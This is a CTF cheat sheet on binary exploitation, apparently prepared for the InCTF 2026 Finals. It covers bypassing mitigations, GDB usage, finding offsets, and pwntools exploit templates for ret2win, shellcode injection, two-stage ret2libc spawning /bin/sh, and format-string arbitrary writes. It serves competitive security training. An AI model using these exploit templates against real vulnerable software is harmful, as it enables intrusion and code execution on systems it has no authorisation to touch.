# ⚔️ CTF PWN / BINARY EXPLOITATION MASTER BIBLE
### InCTF 2026 Finals — Zero to Hero Reference (Rule 14 Offline Compliant)

---

## 1. Initial Reconnaissance & Protections (Checksec)

```bash
file ./challenge              # 32-bit vs 64-bit, statically vs dynamically linked, stripped?
checksec --file=./challenge   # Check binary security mitigations
```

| Protection | What it Means | How to Bypass |
|---|---|---|
| **Canary** (Stack Cookie) | Random value at `$rbp-0x8` before return addr | Leak via Format String (`%p`), brute force (if fork), or don't overwrite it |
| **NX** (No-Execute) | Stack/Heap is NOT executable (no shellcode) | Use **ROP** (Return-Oriented Programming) or **ret2libc** |
| **PIE** (Position Independent) | Binary base address changes every run | Leak any code address, subtract offset to find binary base |
| **RELRO** (Relocation Read-Only)| `Partial`: GOT writable. `Full`: GOT read-only | Partial: GOT overwrite (`printf` -> `system`). Full: Overwrite return addr or hooks |

---

## 2. GDB & Pwndbg Essential Commands

```bash
gdb ./challenge               # Start GDB
r                             # Run program
r < <(python3 -c "print('A'*100)") # Run with input
c                             # Continue
n / s                         # Next instruction (step over) / Step into
b *main                       # Breakpoint at function main
b *0x401234                   # Breakpoint at specific hex address
d                             # Delete all breakpoints
info functions                # List all functions (find win / backdoor)
info variables                # List global variables
disas main                    # Disassemble function main
x/20gx $rsp                   # Examine 20 quadwords in hex from stack top
x/s 0x404040                  # Examine address as string
vmmap                         # View memory map & permissions (pwndbg/gef)
search /bin/sh                # Search string in memory
```

---

## 3. Finding Buffer Overflow Offset

### Using Pwntools / GDB:
```bash
# 1. Generate cyclic pattern of 200 bytes
cyclic 200
# Example output: aaaabaaacaaadaaaeaaafaaagaaahaaa...

# 2. Run inside GDB, paste pattern into input prompt, crash it!
# Look at the crash address in RSP or register:
# E.g., Crash at 0x6161616a ('jaaa')

# 3. Calculate exact offset:
cyclic -l 0x6161616a
# Output: Offset is 72 (64-bit) or 44 (32-bit)
```

---

## 4. Ret2Win (Calling a hidden `win()` or `backdoor()` function)

When NX is ON, PIE is OFF, No Canary:
```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./challenge')
p = process('./challenge') # or remote('IP', PORT)

offset = 72 # Found via cyclic
win_addr = elf.symbols['win'] # or 0x4011d6

# 64-bit stack alignment trick: If it crashes at do_system MOVAPS, add a 'ret' gadget!
ret_gadget = 0x40101a # 'ret' gadget to align 16-byte stack boundary

payload = flat({
    offset: [
        ret_gadget,  # Stack alignment (optional, but prevents movaps crash in 64-bit)
        win_addr
    ]
})

p.sendline(payload)
p.interactive()
```

---

## 5. Shellcode Injection (When NX is DISABLED)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64' # or 'i386'
elf = context.binary = ELF('./challenge')
p = process('./challenge')

# 64-bit execve("/bin/sh", 0, 0) shellcode (23 bytes)
shellcode = asm(shellcraft.sh())

# If the program leaks the stack buffer address:
leak = int(p.recvline().strip(), 16)
log.info(f"Leaked stack buffer: {hex(leak)}")

offset = 72
payload = shellcode + b"A" * (offset - len(shellcode)) + p64(leak)

p.sendline(payload)
p.interactive()
```

---

## 6. Ret2Libc (Bypassing NX with System & /bin/sh)

### Step 1: Leak Libc Base (Call `puts(puts@got)` and return to `main`)
```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./challenge')
libc = ELF('./libc.so.6') # or /lib/x86_64-linux-gnu/libc.so.6
p = process('./challenge')

offset = 72

# 64-bit calling convention: RDI = arg1, RSI = arg2, RDX = arg3
# Find gadgets with: ROPgadget --binary ./challenge | grep "pop rdi"
rop = ROP(elf)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

# --- STAGE 1: LEAK LIBC ---
payload1 = flat({
    offset: [
        POP_RDI,
        elf.got['puts'],       # RDI = address of puts in GOT
        elf.plt['puts'],       # Call puts() -> prints leaked address
        elf.symbols['main']    # Return back to main() to trigger 2nd payload
    ]
})

p.sendline(payload1)
p.recvuntil(b"output\n") # Adjust to challenge prompt
leaked_puts = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Leaked puts: {hex(leaked_puts)}")

# Calculate libc base
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# --- STAGE 2: EXECUTE SYSTEM('/bin/sh') ---
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload2 = flat({
    offset: [
        RET,                  # 16-byte stack alignment
        POP_RDI,
        bin_sh,               # RDI = pointer to '/bin/sh'
        system_addr           # call system('/bin/sh')
    ]
})

p.sendline(payload2)
p.interactive()
```

---

## 7. Format String Vulnerabilities (`printf(user_input)`)

### 1. Leak Stack & Find Input Offset:
Send: `%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`
Or send `AAAA_%p_%p_%p_%p_%p_%p_%p_%p` and see which `%p` prints `0x41414141` (`AAAA`).
If it's the 6th parameter -> **Offset = 6**.

### 2. Direct Leaks:
- Leak 6th stack value: `%6$p`
- Leak Canary (usually at offset 11, 13, or 15): `%11$p`
- Read string from pointer at offset 6: `%6$s`

### 3. Arbitrary Write with Pwntools (`fmtstr_payload`):
```python
from pwn import *

# Overwrite target_address (e.g. exit@got) with win_function
offset = 6 # Your format string offset
target_addr = 0x404028 # e.g., GOT entry of exit
value_to_write = 0x4011d6 # Address of win()

payload = fmtstr_payload(offset, {target_addr: value_to_write})
p.sendline(payload)
```

---

## 8. Common Pwntools Cheatsheet
```python
p32(0xdeadbeef)         # Pack 32-bit int to bytes (\xef\xbe\xad\xde)
p64(0xdeadbeef)         # Pack 64-bit int to bytes
u32(b'\xef\xbe\xad\xde') # Unpack bytes to 32-bit int
u64(data.ljust(8, b'\x00')) # Unpack 6-byte leak to 64-bit int
p.sendline(b"hello")    # Send string with newline
p.recvuntil(b"flag:")   # Wait until specific string
p.interactive()         # Drop into interactive shell
```
